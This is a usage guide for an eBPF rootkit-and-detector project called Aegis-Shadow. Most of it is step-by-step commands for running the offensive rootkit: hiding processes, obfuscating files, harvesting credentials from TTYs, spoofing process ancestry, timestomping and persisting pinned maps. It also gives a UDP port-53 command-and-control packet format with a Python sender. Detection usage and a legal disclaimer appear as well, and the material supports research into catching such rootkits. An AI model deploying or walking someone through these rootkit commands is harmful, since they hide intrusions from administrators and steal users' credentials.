# Aegis-Shadow Usage Guide

## Prerequisites

### System Requirements
- Linux kernel 5.10 or later with BTF support
- x86_64 architecture
- Root/sudo privileges
- At least 2GB RAM

### Software Dependencies
```bash
# Install Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Install nightly toolchain
rustup install nightly
rustup component add rust-src --toolchain nightly

# Install bpf-linker
cargo install bpf-linker

# Install system dependencies (Ubuntu/Debian)
sudo apt-get install -y \
    clang \
    llvm \
    libelf-dev \
    linux-headers-$(uname -r) \
    build-essential \
    pkg-config

# Verify BTF support
ls /sys/kernel/btf/vmlinux
```

## Building the Project

### Quick Build
```bash
# Build everything (eBPF + user-space)
cargo xtask build-ebpf --release
cargo build --release

# Or use the Makefile
make build
```

### Development Build
```bash
# Debug build with verbose output
cargo xtask build-ebpf
cargo build
```

### Verify Environment
```bash
# Check all dependencies
./verify-env.sh
```

## Offensive Rootkit Usage

### Basic Usage

```bash
# Start the rootkit with default settings
sudo ./target/release/offense --iface eth0
```

### Feature-Specific Examples

#### 1. Process Hiding
```bash
# Hide a specific process
sudo ./target/release/offense --iface eth0 --hide-pid 1234

# Hide current shell
sudo ./target/release/offense --iface eth0 --hide-pid $$
```

#### 2. File Obfuscation
```bash
# Get file inode
INODE=$(stat -c %i /path/to/secret.txt)

# Obfuscate the file
sudo ./target/release/offense --iface eth0 --obfuscate-inode $INODE
```

#### 3. Credential Harvesting
```bash
# Monitor TTY device (e.g., pts/0 = 136:0)
sudo ./target/release/offense --iface eth0 --monitor-tty 136:0
```

#### 4. Process Ancestry Spoofing
```bash
# Spoof PID 1234's parent to appear as PID 1 (init)
sudo ./target/release/offense --iface eth0 --spoof-ppid 1234:1
```

#### 5. Timestomping
```bash
# Fake timestamps (format: inode:atime:mtime:ctime)
INODE=$(stat -c %i /path/to/file.txt)
sudo ./target/release/offense --iface eth0 \
    --timestomp $INODE:1609459200:1609459200:1609459200
```

#### 6. Map Persistence
```bash
# Pin BPF maps to filesystem for persistence
sudo ./target/release/offense --iface eth0 --pin-maps

# Maps will be available at /sys/fs/bpf/aegis_shadow/
```

### Network C2 Commands

The rootkit listens for UDP packets on port 53 with the following format:

```
[4 bytes: MAGIC_BYTES] [12 bytes: nonce] [16 bytes: encrypted payload] [16 bytes: MAC]
```

**Command Types:**
- `cmd_type=1`: Hide PID (arg1=PID)
- `cmd_type=2`: Unhide PID (arg1=PID)
- `cmd_type=3`: Obfuscate file (arg1=inode)
- `cmd_type=5`: Reserved for future use

**Example C2 Packet (Python):**
```python
import socket
import struct

MAGIC = b'\xDE\xAD\xBE\xEF'
KEY = b'0123456789abcdef0123456789abcdef'  # 32 bytes

# Command: Hide PID 1234
cmd_type = 1
arg1 = 1234
arg2 = 0

payload = struct.pack('<III', cmd_type, arg1, arg2)
# Add encryption and MAC here...

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(MAGIC + nonce + encrypted + mac, ('target_ip', 53))
```

### Stopping the Rootkit

```bash
# Press Ctrl+C in the terminal running the offense loader
# Or kill the process
sudo pkill -9 offense
```

## Defensive Detection Usage

### Basic Usage

```bash
# Run all detection modules
sudo ./target/release/defense --all-modules

# Run with verbose logging
sudo ./target/release/defense --all-modules --verbose

# Save alerts to JSON file
sudo ./target/release/defense --all-modules --output /tmp/alerts.json
```

### Module-Specific Detection

```bash
# Enable only specific modules
sudo ./target/release/defense \
    --ghost-maps \
    --syscall-latency \
    --bytecode-check

# Set alert threshold (1=Low, 2=Medium, 3=High, 4=Critical)
sudo ./target/release/defense --all-modules --threshold 3

# Custom calibration period (default: 60 seconds)
sudo ./target/release/defense --all-modules --calibration-period 120
```

### Analyzing Alerts

```bash
# View real-time alerts
sudo ./target/release/defense --all-modules --verbose

# Parse JSON output
jq '.alert_type' /tmp/alerts.json | sort | uniq -c

# Filter by severity
jq 'select(.severity == "HIGH")' /tmp/alerts.json

# Get alert timeline
jq -r '[.timestamp, .alert_type, .pid] | @tsv' /tmp/alerts.json
```

## Testing

### Automated Tests

```bash
# Run offense test suite
sudo ./tests/test_offense.sh

# Run defense test suite
sudo ./tests/test_defense.sh

# Run all tests via Makefile
make test
```

### Manual Testing

#### Test Process Hiding
```bash
# Terminal 1: Start rootkit
sudo ./target/release/offense --iface eth0 --hide-pid $$

# Terminal 2: Verify hiding
ps aux | grep $$  # Should not appear
ls /proc/$$       # Should still exist
```

#### Test File Obfuscation
```bash
# Create test file
echo "secret data" > /tmp/test.txt
INODE=$(stat -c %i /tmp/test.txt)

# Start rootkit with obfuscation
sudo ./target/release/offense --iface eth0 --obfuscate-inode $INODE

# Try to read file
cat /tmp/test.txt  # Should show zeros
```

#### Test Defense Detection
```bash
# Terminal 1: Start defense
sudo ./target/release/defense --all-modules --verbose

# Terminal 2: Start offense (should trigger alerts)
sudo ./target/release/offense --iface eth0 --hide-pid 1234

# Check Terminal 1 for alerts
```

## Troubleshooting

### Common Issues

#### 1. BTF Not Available
```bash
# Check BTF support
ls /sys/kernel/btf/vmlinux

# If missing, rebuild kernel with CONFIG_DEBUG_INFO_BTF=y
```

#### 2. Permission Denied
```bash
# Ensure running as root
sudo -i

# Check RLIMIT_MEMLOCK
ulimit -l  # Should be unlimited
```

#### 3. XDP Attachment Failed
```bash
# Check interface exists
ip link show eth0

# Detach existing XDP programs
sudo ip link set dev eth0 xdp off
```

#### 4. Map Pinning Failed
```bash
# Ensure bpffs is mounted
mount | grep bpf

# Mount if needed
sudo mount -t bpf bpf /sys/fs/bpf
```

### Debug Mode

```bash
# Enable eBPF verifier logs
echo 1 | sudo tee /proc/sys/kernel/bpf_stats_enabled

# View BPF program info
sudo bpftool prog list
sudo bpftool map list

# Dump program instructions
sudo bpftool prog dump xlated id <ID>

# Check kernel logs
sudo dmesg | grep -i bpf
```

## Performance Tuning

### Reduce Overhead
```bash
# Disable verbose logging
./target/release/offense --iface eth0  # No --verbose flag

# Limit event monitoring
# Edit source to reduce PerfEventArray buffer size
```

### Optimize for Production
```bash
# Build with maximum optimizations
RUSTFLAGS="-C target-cpu=native" cargo build --release

# Use LTO (Link-Time Optimization)
# Already enabled in Cargo.toml
```

## Security Warnings

⚠️ **CRITICAL WARNINGS:**

1. **Legal Use Only**: This tool is for authorized security research and testing only
2. **Controlled Environment**: Only use in isolated lab environments
3. **No Production Use**: Never deploy on production systems
4. **Ethical Responsibility**: Misuse may violate laws and regulations
5. **Data Protection**: Handle captured credentials responsibly

## Cleanup

```bash
# Stop all programs
sudo pkill -9 offense
sudo pkill -9 defense

# Remove pinned maps
sudo rm -rf /sys/fs/bpf/aegis_shadow/

# Detach XDP/TC programs
sudo ip link set dev eth0 xdp off
sudo tc filter del dev eth0 egress

# Clean build artifacts
make clean
```

## Advanced Usage

### Custom C2 Server
See `examples/c2_server.py` for a reference implementation.

### Kernel Module Integration
The rootkit can coexist with kernel modules for enhanced stealth.

### Multi-Interface Deployment
```bash
# Attach to multiple interfaces
sudo ./target/release/offense --iface eth0 &
sudo ./target/release/offense --iface wlan0 &
```

## Support

For issues, questions, or contributions:
- GitHub Issues: [Project Repository]
- Documentation: See README.md and ARCHITECTURE.md
- Security Research: Follow responsible disclosure practices